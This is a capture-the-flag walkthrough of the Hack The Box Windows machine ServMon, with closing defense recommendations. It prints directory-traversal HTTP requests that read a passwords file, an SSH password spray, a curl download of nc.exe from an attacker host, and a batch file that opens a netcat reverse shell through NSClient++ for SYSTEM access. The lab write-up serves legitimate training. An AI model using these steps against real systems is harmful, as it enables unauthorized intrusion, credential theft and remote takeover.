# ServMon HTB Walkthrough

A comprehensive penetration testing walkthrough for the **ServMon** machine from Hack The Box, detailing reconnaissance, vulnerability assessment, exploitation, and privilege escalation.

## Executive Summary

**ServMon** is a Windows-based vulnerable machine that demonstrates common security misconfigurations in real-world environments. The box involves multiple attack vectors including FTP anonymous access, web application vulnerabilities, and service misconfigurations leading to full system compromise.

**Key Vulnerabilities Exploited:**
- FTP Anonymous Access
- NVMS 1000 Directory Traversal
- Weak Password Policies
- NSClient++ Privilege Escalation

## Reconnaissance

### Network Scanning

Initial network reconnaissance was performed to identify open ports and services:

```bash
export target=10.129.227.77

# Comprehensive port scan
sudo nmap -p- --min-rate 1000 -sT -vvv $target
```

<img width="442" height="52" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />

<img width="501" height="583" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />

**Discovered Ports:**
- 21/tcp    - FTP
- 22/tcp    - SSH
- 80/tcp    - HTTP
- 135/tcp   - RPC
- 139/tcp   - NetBIOS
- 445/tcp   - SMB
- 5666/tcp  - NRPE
- 6063/tcp  - Unknown
- 6699/tcp  - Unknown
- 8443/tcp  - HTTPS (Alternative)
- 49664-49670/tcp - Windows RPC

### Service Enumeration

Detailed service version detection and script scanning:

```bash
sudo nmap -sC -sV -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 -T4 $target
```

<img width="899" height="960" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />


**Key Findings:**
- FTP service allowing anonymous login
- HTTP service running NVMS 1000 software

<img width="870" height="755" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />

- Multiple Windows-specific services indicating a Windows host

## Enumeration

### FTP Service Analysis

Anonymous FTP access revealed sensitive information:

```bash
wget -r ftp://anonymous:@10.129.227.77
```

**Discovered Files:**
- `Users/Nadine/Confidential.txt` - Internal communication about password files
- `Users/Nathan/Notes to do.txt` - TODO list revealing security practices

```bash
┌──(aravinda㉿kali)-[~/…/servmon/10.129.227.77/Users/Nadine]
└─$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine 

┌──(aravinda㉿kali)-[~/…/servmon/10.129.227.77/Users/Nathan]
└─$ cat 'Notes to do.txt'
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint                                                                                                                      
```

### Web Application Assessment

The web service on port 80 hosted NVMS 1000 software:

```
http://10.129.227.77/Pages/login.htm
```

**Vulnerability Research:**
```bash
searchsploit 'nvms 1000'
```

<img width="954" height="174" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />

**Identified Exploits:**
- Directory Traversal vulnerability (CVE-2019-20085)
- Multiple public exploits available

### Directory Traversal Exploitation

Using the directory traversal vulnerability to access sensitive files:

**Initial request**

<img width="455" height="444" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />

**HTTP Request:**
```http
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.129.227.77
```

<img width="960" height="521" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />

**Modified to access user files:**
```http
GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
Host: 10.129.227.77
```

<img width="924" height="447" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />

**Retrieved Credentials:**
```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

## Initial Foothold

### Credential Testing

Using identified usernames and passwords for authentication:

```bash
# User list
nathan
nadine
administrator

# Password cracking/brute-forcing
crackmapexec ssh 10.129.227.77 -u users.txt -p pass.txt --continue-on-success
```

<img width="947" height="457" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />

**Successful Authentication:**
- Username: `nadine`
- Password: `L1k3B1gBut7s@W0rk`

### Initial Access

```bash
ssh nadine@10.129.227.77
```

<img width="566" height="686" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />

**User Flag:**
```cmd
type C:\Users\Nadine\Desktop\user.txt
0c402c1a0c6ca9d60dde2191ab14eb45
```

## Privilege Escalation

### Internal Service Discovery

Discovered NSClient++ service on port 8443:

```bash
# SSH port forwarding for internal service access
ssh nadine@10.129.227.77 -L 8443:127.0.0.1:8443
```

### NSClient++ Analysis

Accessed the web interface at `https://127.0.0.1:8443/`

**Retrieved NSClient++ Password:**
```cmd
nscp web --password --display
Current password: ew2x6SsGTxjRwXOT
```

<img width="606" height="73" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />

### Exploitation Strategy

Based on research from Exploit-DB (46802), NSClient++ allows execution of external scripts with SYSTEM privileges.

**Attack Procedure:**

1. **Prepare Payload:**
   ```bash
   # Download netcat to target
   curl 10.10.14.106/nc.exe -o C:\programdata\nc.exe
   
   # Create batch file for reverse shell
   echo C:\programdata\nc.exe -e cmd.exe 10.10.14.106 4444 > C:\programdata\exploit.bat
   ```

<img width="809" height="700" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />

2. **Setup Listener:**
   ```bash
   nc -nlvp 4444
   ```

3. **Configure NSClient++ Script:**
   - login

<img width="888" height="529" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />

   - Navigate to Settings > External Scripts > Scripts
   - Add new script named "foobar"
   - Command: `c:\programdata\exploit.bat`
   - Save configuration and reload service

<img width="832" height="390" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />

<img width="493" height="154" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />

4. **Execute Script:**
   - Access `https://127.0.0.1:8443/index.html#/queries/foobar`

<img width="1345" height="505" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />

   - Click "Run" to execute the script

<img width="1336" height="318" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />


### Root Access

**Successful SYSTEM Shell:**
```cmd
whoami
nt authority\system

type C:\Users\Administrator\Desktop\root.txt
8490b03644b0b4c76d393cc428dd230b
```

<img width="582" height="769" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />

## Lessons Learned

### Security Misconfigurations

1. **FTP Service:**
   - Anonymous access enabled
   - Sensitive files accessible without authentication

2. **Web Application:**
   - Outdated NVMS 1000 software with known vulnerabilities
   - Directory traversal vulnerability not patched

3. **Password Management:**
   - Weak password policies
   - Passwords stored in insecure locations
   - Password reuse across accounts

4. **Service Configuration:**
   - NSClient++ configured with excessive privileges
   - External script execution without proper sandboxing

### Defense Recommendations

1. **Network Security:**
   - Disable unnecessary services (FTP, unused ports)
   - Implement network segmentation
   - Use firewall rules to restrict access

2. **Application Security:**
   - Regular vulnerability assessments and patching
   - Web application firewall implementation
   - Secure coding practices

3. **Access Control:**
   - Strong password policies and multi-factor authentication
   - Principle of least privilege for service accounts
   - Regular access reviews and audits

4. **Monitoring:**
   - File integrity monitoring
   - Log analysis for suspicious activities
   - Intrusion detection systems

---

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
